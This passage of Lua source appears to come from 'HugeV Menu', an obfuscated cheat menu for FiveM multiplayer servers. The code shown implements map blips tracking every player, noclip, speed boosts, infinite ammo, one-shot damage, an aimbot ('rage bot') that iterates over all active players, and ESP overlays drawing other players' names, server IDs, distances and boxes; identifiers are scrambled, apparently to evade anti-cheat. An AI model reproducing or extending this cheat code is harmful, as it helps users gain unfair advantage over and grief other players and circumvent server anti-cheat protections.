					if not Czitirzen_Invoke(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Add blip_DSUFSDGSD and create head_DSGHDSIUGDS display on player
						blip_DSUFSDGSD = Czitirzen_Invoke(0x5CDE92C702A8FCE7, ped_DSGUISDGSDG)
						Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
						Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true ) -- ~g~Player blip_DSUFSDGSD indicator
					else -- update blip_DSUFSDGSD
						local veh_DSGIJSODGSDG = GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(ped_DSGUISDGSDG, false)
						local blipSprite_DSIOGJOISDGSDG = GetBlipSprite_HugeV_DSIGHSDIUGSD(blip_DSUFSDGSD)

						if GetEntityHealth_HugeV_DSUGHISDUGSDG(ped_DSGUISDGSDG) == 0 then -- dead
							if blipSprite_DSIOGJOISDGSDG ~= 274 then
								Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 274)
								Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true ) -- ~g~Player blip_DSUFSDGSD indicator
							end
						elseif veh_DSGIJSODGSDG then
							local vehClass_DSIGJOSDIGSDG = Czitirzen_Invoke(0x29439776AAA00A62, veh_DSGIJSODGSDG)
							local vehModel_DSIOGJSODGSD = Czitirzen_Invoke(0x9F47B058362C84B5, veh_DSGIJSODGSDG)
							if vehClass_DSIGJOSDIGSDG == 15 then -- Helicopters
								if blipSprite_DSIOGJOISDGSDG ~= 422 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 422)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 8 then -- Motorcycles
								if blipSprite_DSIOGJOISDGSDG ~= 226 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 226)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 16 then -- Plane
								if vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "besra") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "hydra") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "lazer") then -- Jets
									if blipSprite_DSIOGJOISDGSDG ~= 424 then
										Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 424)
										Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
									end
								elseif blipSprite_DSIOGJOISDGSDG ~= 423 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 423)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 14 then -- Boat
								if blipSprite_DSIOGJOISDGSDG ~= 427 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 427)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "insurgent") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "insurgent2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite_DSIOGJOISDGSDG ~= 426 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "limo2") then -- Turreted Limo
								if blipSprite_DSIOGJOISDGSDG ~= 460 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 460)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "rhino") then -- Tank
								if blipSprite_DSIOGJOISDGSDG ~= 421 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 421)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "trash") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "trash2") then -- Trash
								if blipSprite_DSIOGJOISDGSDG ~= 318 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 318)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "pbus") then -- Prison Bus
								if blipSprite_DSIOGJOISDGSDG ~= 513 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 513)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "seashark") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "seashark2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "seashark3") then -- Speedophiles
								if blipSprite_DSIOGJOISDGSDG ~= 471 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 471)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "cargobob") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "cargobob2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "cargobob3") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "cargobob4") then -- Cargobobs
								if blipSprite_DSIOGJOISDGSDG ~= 481 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 481)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "technical") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "technical2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "technical3") then -- Technical
								if blipSprite_DSIOGJOISDGSDG ~= 426 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "taxi") then -- Cab/ Taxi
								if blipSprite_DSIOGJOISDGSDG ~= 198 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 198)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "fbi") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "fbi2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "police2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "police3") -- Police Vehicles
								or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "police") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "sheriff2") or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "sheriff")
								or vehModel_DSIOGJSODGSD == Czitirzen_Invoke(0xD24D37CC275948CC, "policeold2") then
								if blipSprite_DSIOGJOISDGSDG ~= 56 then
									Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 56)
									Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
								Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
								Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
							end

							-- Show number in case of passangers
							local passengers_DIFJOSDIGSDGSD = GetVehicleNumberOfPassengers_HugeV_DSGUHSDIGSDGDS(veh_DSGIJSODGSDG)

							if passengers_DIFJOSDIGSDGSD > 0 then
								if not IsVehicleSeatFree_HugeV_DUHGYUSFGFD(veh_DSGIJSODGSDG, -1) then
									passengers_DIFJOSDIGSDGSD = passengers_DIFJOSDIGSDGSD + 1
								end
								Czitirzen_Invoke(0xA3C0B359DCB848B6, blip_DSUFSDGSD, passengers_DIFJOSDIGSDGSD)
							else
								Czitirzen_Invoke(0x532CFF637EF80148, blip_DSUFSDGSD)
							end
						else
							-- Remove leftover number
							Czitirzen_Invoke(0x532CFF637EF80148, blip_DSUFSDGSD)

							if blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
								Czitirzen_Invoke(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
								Czitirzen_Invoke(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator

							end
						end

						Czitirzen_Invoke(0xF87683CDF73C3F6E, blip_DSUFSDGSD, math.ceil(GetEntityHeading_HugeV_UDYUGDHIGKDFG(veh_DSGIJSODGSDG))) -- update rotation
						Czitirzen_Invoke(0x127DE7B20C60A6A3, blip_DSUFSDGSD, id_DSHGSIUDGSD) -- update blip_DSUFSDGSD name
						Czitirzen_Invoke(0xD38744167B2FA257, blip_DSUFSDGSD,  0.85) -- set scale

						-- set player alpha
						if Czitirzen_Invoke(0xB0034A223497FFCB) then
							Czitirzen_Invoke(0x45FF974EEE1C8734, blip_DSUFSDGSD, 255 )
						else
							x1_DASUIHDSGSDGSD, y1_DASUIHDSGSDGSD = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0xD80958FC74E988A6), true))
							x2_DASUIHDSGSDGSD, y2_DASUIHDSGSDGSD = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, id_DSHGSIUDGSD), true))
							distance_idshgsdgsdfg = (math.floor(math.abs(math.sqrt((x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) * (x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) + (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD) * (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance_idshgsdgsdfg < 0 then
								distance_idshgsdgsdfg = 0
							elseif distance_idshgsdgsdfg > 255 then
								distance_idshgsdgsdfg = 255
							end
							Czitirzen_Invoke(0x45FF974EEE1C8734, blip_DSUFSDGSD, distance_idshgsdgsdfg)
						end
					end
				end
			end
		else
			local plist_DSGUSDIGDS = GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()
			for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
				local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
				local ped_DSGUISDGSDG = Czitirzen_Invoke(0x43A66C31C68491C0, id_DSHGSIUDGSD)
				local blip_DSUFSDGSD = Czitirzen_Invoke(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)
				if Czitirzen_Invoke(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Removes blip_DSUFSDGSD
					Czitirzen_Invoke(0x86A652570E5F25DD, Citizen.PointerValueIntInitialized(blip_DSUFSDGSD))
				end
			end
		
		end

if Become_A_Flash_DSUGHSDIUGHSID then
	Czitirzen_Invoke(0x57FFF03E423A4C0B, Czitirzen_Invoke(0x4F8644AF03D0E0D6))
	Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.49)
	Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 10.0)
	Czitirzen_Invoke(0xB80D8756B4668AB6, tostring('core'))
	Czitirzen_Invoke(0x6C38AF3693A69A91, tostring('core'))
	Czitirzen_Invoke(0xC95EB1DB6E92113D, tostring('ent_sht_electrical_box'), Czitirzen_Invoke(0x43A66C31C68491C0, -1), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end

if Noclip_dusgoisugsdfg then
	local current_Speed_dishgosdfiulgjdsfg = 2
	local Noclip_Entity_UHDGIUDFLGDFG =
		Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0xD80958FC74E988A6), false) and Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6)) or Czitirzen_Invoke(0xD80958FC74E988A6)
	Czitirzen_Invoke(0x428CA6DBD1094446, Czitirzen_Invoke(0xD80958FC74E988A6), true)
	Czitirzen_Invoke(0x3882114BDE571AD4, Czitirzen_Invoke(0xD80958FC74E988A6), true)
	
	if IsDisabledControlPressed_HugeV_DSUHGSUDGD(0, HugeV_KEYSHTRHRTHTRH["LEFTSHIFT"]) then
	current_Speed_dishgosdfiulgjdsfg = 6
	end

	local new_Pos_dihsufoiugidsfgdsfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(entityfdhudfkidfh)

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 32, true) --MoveUpOnly
	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 268, true) --MoveUp

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 31, true) --MoveUpDown

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 269, true) --MoveDown
	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 33, true) --MoveDownOnly

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 266, true) --MoveLeft
	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 34, true) --MoveLeftOnly

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 30, true) --MoveLeftRight

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 267, true) --MoveRight
	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 35, true) --MoveRightOnly

	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 44, true) --Cover
	Czitirzen_Invoke(0xFE99B66D079CF6BC, 0, 20, true) --MultiplayerInfo

	local y_off_idfhusdgiolgdsigsdrssdfg = 0.0
	local z_off_dauigisdfhgodsfgdsg = 0.0

		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 32) then
			y_off_idfhusdgiolgdsigsdrssdfg = 0.5
		end
		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 33) then
			y_off_idfhusdgiolgdsigsdrssdfg = -0.5
		end
		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 34) then
			Czitirzen_Invoke(0x8E2530AA8ADA980E, Czitirzen_Invoke(0xD80958FC74E988A6), GetEntityHeading_HugeV_UDYUGDHIGKDFG(Czitirzen_Invoke(0xD80958FC74E988A6)) + 3.0)
		end
		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 35) then
			Czitirzen_Invoke(0x8E2530AA8ADA980E, Czitirzen_Invoke(0xD80958FC74E988A6), GetEntityHeading_HugeV_UDYUGDHIGKDFG(Czitirzen_Invoke(0xD80958FC74E988A6)) - 3.0)
		end
		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 44) then
			z_off_dauigisdfhgodsfgdsg = 0.21
		end
		if Czitirzen_Invoke(0xE2587F8CBBD87B1D, 0, 20) then
			z_off_dauigisdfhgodsfgdsg = -0.21
	end

	new_Pos_dihsufoiugidsfgdsfg =
		GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(Noclip_Entity_UHDGIUDFLGDFG, 0.0, y_off_idfhusdgiolgdsigsdrssdfg * (current_Speed_dishgosdfiulgjdsfg + 0.3), z_off_dauigisdfhgodsfgdsg * (current_Speed_dishgosdfiulgjdsfg + 0.3))

	local heading_idfhgsodiugsdrsdfg = GetEntityHeading_HugeV_UDYUGDHIGKDFG(Noclip_Entity_UHDGIUDFLGDFG)
	Czitirzen_Invoke(0x1C99BB7B6E96D16F, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0)
	Czitirzen_Invoke(0x8524A8B0171D5E07, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0, 0, false)
	Czitirzen_Invoke(0x8E2530AA8ADA980E, Noclip_Entity_UHDGIUDFLGDFG, heading_idfhgsodiugsdrsdfg)

	Czitirzen_Invoke(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, false, false)
	Czitirzen_Invoke(0x239A3351AC1DA385, Noclip_Entity_UHDGIUDFLGDFG, new_Pos_dihsufoiugidsfgdsfg.x, new_Pos_dihsufoiugidsfgdsfg.y, new_Pos_dihsufoiugidsfgdsfg.z, true, true, true)

	Czitirzen_Invoke(0x428CA6DBD1094446, Noclip_Entity_UHDGIUDFLGDFG, false)
	Czitirzen_Invoke(0x3882114BDE571AD4, Noclip_Entity_UHDGIUDFLGDFG, false)
	Czitirzen_Invoke(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, true, true)
end

if force_3_osoba_xd_dihgsdiugsdf then
	Czitirzen_Invoke(0x5A4F9EDF1673F704, 0)
	Czitirzen_Invoke(0xAC253D7842768F48, 0)
	Czitirzen_Invoke(0xDE2EF5DA284CC8DF)
end

if force_drive_by_xd_dihgsdiugsdf then
Czitirzen_Invoke(0x6E8834B52EC20C77, Czitirzen_Invoke(0x4F8644AF03D0E0D6), true)
end


if celownik_1_duifhosidugldsf then
local aiming_idhgsiduhgidf, entityfdhudfkidfh = GetEntityPlayerIsFreeAimingAt(Czitirzen_Invoke(0x4F8644AF03D0E0D6), entityfdhudfkidfh)
local aiming_idhgsiduhgidf2 = Czitirzen_Invoke(0x2E397FD2ECD37C87, Czitirzen_Invoke(0x4F8644AF03D0E0D6))
	if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("+",0.495,0.484)
	elseif aiming_idhgsiduhgidf then
	if Czitirzen_Invoke(0x524AC5ECEA15343E, entityfdhudfkidfh) and not Czitirzen_Invoke(0x3317DEDB88C95038, entityfdhudfkidfh, 0) and Czitirzen_Invoke(0x12534C348C6CB68B, entityfdhudfkidfh) then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~+",0.495,0.484)
	else
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("+",0.495,0.484)
	end
end
end


if celownik_2_idsoaygh8reigdsfg then
local aiming_idhgsiduhgidf, entityfdhudfkidfh = GetEntityPlayerIsFreeAimingAt(Czitirzen_Invoke(0x4F8644AF03D0E0D6), entityfdhudfkidfh)
local aiming_idhgsiduhgidf2 = Czitirzen_Invoke(0x2E397FD2ECD37C87, Czitirzen_Invoke(0x4F8644AF03D0E0D6))
	if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg(".",0.4968,0.478)
	elseif aiming_idhgsiduhgidf then
	if Czitirzen_Invoke(0x524AC5ECEA15343E, entityfdhudfkidfh) and not Czitirzen_Invoke(0x3317DEDB88C95038, entityfdhudfkidfh, 0) and Czitirzen_Invoke(0x12534C348C6CB68B, entityfdhudfkidfh) then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~.",0.4968,0.478)
	else
		narysuj_celownik_xd_uhfaidsoulgdfsdfg(".",0.4968,0.478)
	end
end
end

if nieskonczone_ammo_rozumieszXD_diufyasdigdsdfgdf then
	for i_didsfyg98sduriesdfg=1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
	Czitirzen_Invoke(0x183DADC6AA953186, Czitirzen_Invoke(0xD80958FC74E988A6), true)
	Czitirzen_Invoke(0x3EDCB0505123623B, Czitirzen_Invoke(0xD80958FC74E988A6), true, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg])
	end
else
	for i_didsfyg98sduriesdfg=1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
		Czitirzen_Invoke(0x183DADC6AA953186, Czitirzen_Invoke(0xD80958FC74E988A6), false)
		Czitirzen_Invoke(0x3EDCB0505123623B, Czitirzen_Invoke(0xD80958FC74E988A6), false, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg])
	end
end

if oneshot_USHGUYHKGFDGDF then
Czitirzen_Invoke(0xCE07B9F7817AADA3, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 10000.0)
Czitirzen_Invoke(0x4A3DC7ECCC321032, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 10000.0)
else
Czitirzen_Invoke(0xCE07B9F7817AADA3, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.0)
Czitirzen_Invoke(0x4A3DC7ECCC321032, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.0)
end

if discordPresence_YFGUIFSFEWYKUFYDSFF then
Czitirzen_Invoke(0x6A02254D, tostring(763108426448371743))
Czitirzen_Invoke(0x53DFD530, tostring('icon')) 
Czitirzen_Invoke(0x7BDCBD45, tostring('\nHugeV Menu Alpha 1.0'))
Czitirzen_Invoke(0xB029D2FA, tostring('https://discord.gg/bwCjfsR'))   
Czitirzen_Invoke(0xF61D04C4, tostring(''))
Czitirzen_Invoke(0x35E62B6A, tostring(''))
else
Czitirzen_Invoke(0x6A02254D, tostring(0))
Czitirzen_Invoke(0x53DFD530, tostring(''))     
Czitirzen_Invoke(0x7BDCBD45, tostring(''))
Czitirzen_Invoke(0xB029D2FA, tostring(''))  
Czitirzen_Invoke(0xF61D04C4, tostring(''))
Czitirzen_Invoke(0x35E62B6A, tostring(''))   
end

if antiaim_SDGISDIGSDGSD then
local ped_DSIHGUSDGSD = Czitirzen_Invoke(0xD80958FC74E988A6)
heading_ADIGSDGSD = heading_ADIGSDGSD + math.random(30,50)
if heading_ADIGSDGSD == 360 then
heading_ADIGSDGSD = 0
else
local ped_DSIHGUSDGSD = Czitirzen_Invoke(0x43A66C31C68491C0, -1 )
Czitirzen_Invoke(0x6EA47DAE7FAD0EED, "move_ped_crouched")

while ( not Czitirzen_Invoke(0xC4EA073D86FB29B0, "move_ped_crouched", Citizen.ReturnResultAnyway()) ) do 
    Czlowiek_Wait_IDYGOSIFJGDFG( 100 )
end 

if ( crouched_DSIHGIUSDGSD == true ) then 
    Czitirzen_Invoke(0xAA74EC0CB0AAEA2C, ped_DSIHGUSDGSD, 0 )
    crouched_DSIHGIUSDGSD = false 
elseif ( crouched_DSIHGIUSDGSD == false ) then
    Czitirzen_Invoke(0xAF8A94EDE7712BEF, ped_DSIHGUSDGSD, "move_ped_crouched", 0.25 )
    crouched_DSIHGIUSDGSD = true 
end
Czitirzen_Invoke(0x8E2530AA8ADA980E, ped_DSIHGUSDGSD, IntToFloat_NUGTHBGNURTHNHTR(heading_ADIGSDGSD))
end
end

if rage_bot_toogle_ifdsygdiufgsdfg then
    
    local plist_iduygusdigsdfg = GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()
    for i_didsfyg98sduriesdfg = 1, #plist_iduygusdigsdfg do
        rage_bot_UGDUYFHDSIGKHUIDFGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, plist_iduygusdigsdfg[i_didsfyg98sduriesdfg]))
    end

end


          if esp_duhsgiudfgdfg then
            for i_didsfyg98sduriesdfg=1,256 do
              if  ((Czitirzen_Invoke(0xB8DFD30D6973E135, i_didsfyg98sduriesdfg )) and Czitirzen_Invoke(0x43A66C31C68491C0, i_didsfyg98sduriesdfg ) ~= Czitirzen_Invoke(0x43A66C31C68491C0, -1 )) then
                local kolorek_espa_xd_IDHFUDSHUIFDSF = {r = 0, g = 191, b = 41}
                local pPed_dushsigdsfgdf = Czitirzen_Invoke(0x43A66C31C68491C0, i_didsfyg98sduriesdfg)
                local cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0xD80958FC74E988A6, -1)))
                local x, y, z = table.unpack(GetEntityCoords_HugeV_UDHGIUDIKGDFG(pPed_dushsigdsfgdf))
                local disPlayerNames_udsguydgdresd = 130
                local disPlayerNamesz_dusghudfhigsdfg = 999999
				local distance_idshgisudfgsdfg = math.floor(GetDistanceBetweenCoords_HugeV_UDHGIUSDHGIUDF(cx_duihsgiudfgdf,  cy_duhifsudgsdfg,  cz_dsyaugfidsgsdf,  x,  y,  z,  true))
                  if nameabove_duhsgsiudgsdgrdf then
                      if ((distance_idshgisudfgsdfg < disPlayerNames_udsguydgdresd)) then
                        if Czitirzen_Invoke(0x031E11F3D447647E, i_didsfyg98sduriesdfg, Citizen.ReturnResultAnyway()) then
                          DrawText3D_HugeV_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_didsfyg98sduriesdfg).." |  "..GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(i_didsfyg98sduriesdfg), 21, 0, 255)
                        else
                          DrawText3D_HugeV_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_didsfyg98sduriesdfg).." |  "..GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(i_didsfyg98sduriesdfg), kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b)
                        end
                      end
                  end
                local message_UDYUGSIDGFDG =
                "Name: "..
                GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(i_didsfyg98sduriesdfg) ..
                "\nServer ID: "..
                GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_didsfyg98sduriesdfg) ..
                "\nDist: ".. math_round_DSIHGIUDFJGIDF(GetDistanceBetweenCoords_HugeV_UDHGIUSDHGIUDF(cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, true), 1)
                if ((distance_idshgisudfgsdfg < disPlayerNamesz_dusghudfhigsdfg)) then
                if espinfo_ihfdsoudgifgdfg and esp_duhsgiudfgdfg then
                  DrawText3D_HugeV_UDGUYSDHUGSFFDG(x, y, z - 1.0, message_UDYUGSIDGFDG, kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b)
                end
                if espbox_dsuhfisdugsdfg and esp_duhsgiudfgdfg then
                  local LineOneBegin_GDUYSYUFDGREGDFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local LineOneEnd_DUIYGUISHIGFDGFDG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoBegin_UIDSGISDGGFDGF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoEnd_DISUIHFIUSDGDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeBegin_UDHIGUFFDGIHUDF = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeEnd_DSUYFTUDSGYFDSFG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local LineFourBegin_SUAYGFTDGSUYFSD = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)

                  local TLineOneBegin_DGUFYHDSIGDFHU = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
